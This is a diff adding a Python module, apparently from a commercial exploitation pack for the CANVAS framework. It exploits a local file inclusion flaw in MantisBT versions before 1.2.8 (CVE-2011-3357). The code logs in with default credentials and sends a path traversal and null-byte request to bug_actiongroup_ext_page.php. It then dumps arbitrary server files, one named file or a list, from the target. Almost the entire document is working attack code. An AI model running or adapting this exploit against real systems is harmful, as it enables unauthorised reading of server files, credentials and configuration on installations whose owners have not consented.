@@ -1,0 +1,172 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2011
+#
+
+import sys, time, os, re
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+import StringIO
+
+NAME = "d2sec_mantisbt"
+VERSION = "0.1"
+DESCRIPTION = "MantisBT Local File Include Vulnerability"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+NOTES="""
+Argument flist: specify a file containing a list of files to dump
+"""
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "< 1.2.8"
+DOCUMENTATION["Date public"] = "2011/09/05"
+DOCUMENTATION["References"] = "https://www.htbridge.ch/advisory/multiple_vulnerabilities_in_mantisbt.html"
+DOCUMENTATION["CVE Name"] = "CVE-2011-3357"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3357"
+DOCUMENTATION["Notes"] = NOTES
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ''
+    self.port = 80 
+    self.username = 'administrator'
+    self.password = 'root'
+    self.fname = '' 
+    self.flist = ''
+    self.https = 0
+    self.uri = ''
+    self.proto = 'http'
+    self.name = NAME
+	
+  def mantis_login(self):
+    content = StringIO.StringIO()
+    try:
+      import pycurl
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      self.log('[D2] Install module python-pycurl')
+      return ''
+    try:
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, '%s://%s/%s/login.php' % (self.proto, self.host, self.uri))
+      c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+      c.setopt(pycurl.POSTFIELDS, 'return=index.php&username=%s&password=%s&secure_session=on' % (self.username, self.password))
+      c.setopt(pycurl.POST, 1)
+      c.setopt(pycurl.FOLLOWLOCATION, 1)
+      c.setopt(pycurl.WRITEFUNCTION, content.write)
+      c.setopt(pycurl.COOKIEFILE, 'cookie.txt')
+      c.setopt(pycurl.COOKIEJAR, 'cookie.txt')
+      if self.https:
+        c.setopt(c.SSL_VERIFYPEER, 0)
+        c.setopt(c.SSL_VERIFYHOST, 0)
+      c.perform()
+      c.close()
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      return 1
+    data = content.getvalue()
+    content.close()
+    if 'Logged in as: ' in data:
+      return 0
+    self.log('[D2] Not logged as %s' % self.username)
+    return 1
+    
+  def mantis_exploit_lfi(self, fname):
+    content = StringIO.StringIO()
+    try:
+      import pycurl
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      self.log('[D2] Install module python-pycurl')
+      return ''
+    try:
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, '%s://%s/%s/bug_actiongroup_ext_page.php?bug_arr[]=1&action=EXT_/../../../../../../..%s%%00' % (self.proto, self.host, self.uri, fname))
+      c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+      c.setopt(pycurl.COOKIEFILE, 'cookie.txt')
+      c.setopt(c.WRITEFUNCTION, content.write)
+      c.setopt(c.TIMEOUT, 15)
+      if self.https:
+        c.setopt(c.SSL_VERIFYPEER, 0)
+        c.setopt(c.SSL_VERIFYHOST, 0)
+      c.perform()
+      c.close()
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      return ''
+    data = content.getvalue()
+    content.close()
+    data = re.findall('<table class="width75" cellspacing="1">.*?<br />', data, re.DOTALL)[0]
+    data = data.replace('<table class="width75" cellspacing="1">\n\t', '')
+    data = data.replace('<br />', '')
+    data = data.split('\n')
+    return '\n'.join(data)
+
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port",self.port))
+    self.username = self.argsDict.get("username",self.username)
+    self.password = self.argsDict.get("password",self.password)
+    self.fname = self.argsDict.get("fname",self.fname)
+    self.uri = self.argsDict.get("uri",self.uri)
+    self.flist = self.argsDict.get("flist",self.flist)
+    self.https = int(self.argsDict.get("https",self.https))
+
+  def run(self):
+    self.getargs()
+    if self.https:
+      self.proto = 'https'
+    self.setInfo('[D2] %s attacking %s:%d' % (NAME,self.host,self.port))
+    if len(self.fname) > 0 and len(self.flist) > 0:
+      self.log('[D2] You must only specify a file or a list of files')
+      return 0
+    flist = []
+    if len(self.fname) > 0:
+      flist.append(self.fname)
+    elif len(self.flist) > 0:
+      try:
+        ftemp = open(self.flist, "r").readlines()
+      except:
+        self.log("[D2] Can't find %s" % self.flist)
+        self.setInfo('[D2] %s attacking %s:%d - failed' % (NAME,self.host,self.port))
+        return 0
+      for f in ftemp:
+        f = f.strip()
+        flist.append(f)
+    else:
+      self.log('[D2] No file or list of files specified')
+      self.setInfo('%s attacking %s:%d - failed' % (NAME,self.host,self.port))
+      return 0
+    self.mantis_login()
+    for f in flist:
+      self.log('[#] %s' % f)
+      self.log(self.mantis_exploit_lfi(f))
+      self.log('\n')
+    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    os.unlink('cookie.txt')
+    return 1
+
+  def usage(self):
+    print "Usage: "+sys.argv[0]+" -t target [-p port:80] -O https:[0|1] -O uri:<path> -O username:<username> -O password:<password> -O fname:<path> -O flist:<path>" 
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
